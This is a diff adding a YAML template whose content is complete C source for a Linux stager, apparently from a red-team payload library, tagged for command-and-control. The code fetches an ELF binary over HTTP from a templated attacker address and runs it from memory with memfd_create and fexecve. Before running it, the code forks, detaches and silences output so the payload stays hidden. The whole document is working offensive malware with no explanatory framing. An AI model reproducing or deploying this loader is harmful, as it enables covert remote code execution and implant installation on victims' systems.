@@ -1,0 +1,136 @@
+---
+metadata:
+  filename: "stager-linux-x64-poseidon-http-elf-detach.c.yaml"
+  tags: ["linux", "c2"]
+  created: "2026-05-31"
+  authors: ["@TIVKU"]
+
+content: |
+  #define _GNU_SOURCE
+  #include <arpa/inet.h>
+  #include <fcntl.h>
+  #include <netinet/in.h>
+  #include <stdlib.h>
+  #include <string.h>
+  #include <sys/socket.h>
+  #include <sys/syscall.h>
+  #include <sys/types.h>
+  #include <unistd.h>
+
+  #ifndef MFD_CLOEXEC
+  #define MFD_CLOEXEC 0x0001U
+  #endif
+
+  #define POSEIDON_HOST "{{ attacker_ip }}"
+  #define POSEIDON_PORT {{ delivery_outbound_port }}
+  #define POSEIDON_PATH "/update"
+
+  struct buf {
+      unsigned char *data;
+      size_t len;
+  };
+
+  static int fetch(struct buf *out)
+  {
+      struct sockaddr_in addr = {0};
+      addr.sin_family = AF_INET;
+      addr.sin_port = htons(POSEIDON_PORT);
+      if (inet_pton(AF_INET, POSEIDON_HOST, &addr.sin_addr) != 1)
+          return -1;
+
+      int fd = socket(AF_INET, SOCK_STREAM, 0);
+      if (fd < 0) return -1;
+
+      if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+          close(fd); return -1;
+      }
+
+      const char req[] = "GET " POSEIDON_PATH " HTTP/1.0\r\n"
+                         "Host: " POSEIDON_HOST "\r\n\r\n";
+      if (write(fd, req, sizeof(req) - 1) < 0) {
+          close(fd); return -1;
+      }
+
+      struct buf raw = { NULL, 0 };
+      unsigned char chunk[8192];
+      ssize_t n;
+      while ((n = read(fd, chunk, sizeof(chunk))) > 0) {
+          unsigned char *tmp = realloc(raw.data, raw.len + (size_t)n);
+          if (!tmp) { close(fd); free(raw.data); return -1; }
+          raw.data = tmp;
+          memcpy(raw.data + raw.len, chunk, (size_t)n);
+          raw.len += (size_t)n;
+      }
+      close(fd);
+
+      for (size_t i = 0; i + 3 < raw.len; i++) {
+          if (raw.data[i]   == 0x0d && raw.data[i+1] == 0x0a &&
+              raw.data[i+2] == 0x0d && raw.data[i+3] == 0x0a) {
+              size_t off = i + 4;
+              out->len = raw.len - off;
+              out->data = malloc(out->len);
+              if (!out->data) { free(raw.data); return -1; }
+              memcpy(out->data, raw.data + off, out->len);
+              free(raw.data);
+              return 0;
+          }
+      }
+
+      free(raw.data);
+      return -1;
+  }
+
+  static void exec_elf(struct buf *b)
+  {
+      int fd = (int)syscall(SYS_memfd_create, "", MFD_CLOEXEC);
+      if (fd < 0) return;
+
+      const unsigned char *p = b->data;
+      size_t rem = b->len;
+      while (rem > 0) {
+          ssize_t n = write(fd, p, rem);
+          if (n <= 0) { close(fd); return; }
+          p += (size_t)n;
+          rem -= (size_t)n;
+      }
+
+      char *argv[] = { "", NULL };
+      char *envp[] = { NULL };
+      fexecve(fd, argv, envp);
+      close(fd);
+  }
+
+  int main(void)
+  {
+      struct buf payload = { NULL, 0 };
+
+      if (fetch(&payload) != 0 || payload.len == 0) {
+          free(payload.data);
+          return 1;
+      }
+
+      pid_t pid = fork();
+      if (pid < 0) {
+          free(payload.data);
+          return 1;
+      }
+      if (pid > 0) {
+          free(payload.data);
+          return 0;
+      }
+
+      setsid();
+
+      int devnull = open("/dev/null", O_RDWR);
+      if (devnull >= 0) {
+          dup2(devnull, STDIN_FILENO);
+          dup2(devnull, STDOUT_FILENO);
+          dup2(devnull, STDERR_FILENO);
+          if (devnull > STDERR_FILENO)
+              close(devnull);
+      }
+
+      exec_elf(&payload);
+      free(payload.data);
+      return 1;
+  }
